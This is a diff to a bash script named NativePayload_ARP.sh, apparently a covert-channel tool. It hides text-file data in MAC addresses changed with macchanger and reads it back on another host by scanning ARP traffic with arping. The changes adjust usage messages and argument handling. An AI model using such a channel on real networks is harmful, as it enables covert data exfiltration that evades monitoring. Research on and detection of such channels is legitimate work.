@@ -10,9 +10,9 @@ then
 tput setaf 2;
 	echo
 	echo "Example Step1: (Client Side ) ./NativePayload_ARP.sh -s text-file eth0 delay x"
-	echo "Example Step2: (Server Side ) ./NativePayload_ARP.sh -a vboxnet target-IPv4 x"
+	echo "Example Step2: (Server Side ) ./NativePayload_ARP.sh -a vboxnet target-IPv4 "
 	echo "example IPv4:192.168.56.101 : ./NativePayload_ARP.sh -s mytext.txt eth0 delay 3"
-	echo "example IPv4:192.168.56.1 : ./NativePayload_DNS2.sh -a vboxnet 192.168.56.101 3"
+	echo "example IPv4:192.168.56.1 : ./NativePayload_DNS2.sh -a vboxnet 192.168.56.101 "
 	echo "Description: with Step1 you will inject Data to MAC address for eth0 , with Step2 you can have this text file via Scanning target-system by ARP traffic (Using Arping tool)"
 	echo
 	
@@ -23,10 +23,10 @@ then
 		echo "[!] Changing MAC Address via macchanger Tool"
 		counter=0 
 		Defdelay=3
-		if [ $4 == "delay" ] 
+		if [ $4 == "delay" ]
 			then
-			Defdelay=$5
-			elif [ $4 == null ]
+			Defdelay=$5			
+			elif [ -z "$4" ] 
 			then
 			Defdelay=3
 		fi
@@ -64,7 +64,7 @@ then
 
 fi
 
-#./NativePayload_ARP.sh -a eth0 192.168.56.101 3
+#./NativePayload_ARP.sh -a eth0 192.168.56.101 
 
 if [ $1 == "-a" ]
 then
@@ -73,7 +73,7 @@ then
 	arping -I $2 $3 -w 0 -b > ARPData.txt &
 	init=0
 	Time=`date '+%d/%m/%Y %H:%M:%S'`
-	echo "[!] [$Time] Scanning Target [$3] via Arping by delay ($4)."
+	echo "[!] [$Time] Scanning Target [$3] via Arping by delay (1 sec)."
 	while true; do
 	String=`cat ARPData.txt | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`
 	#printf '\u2591\n'
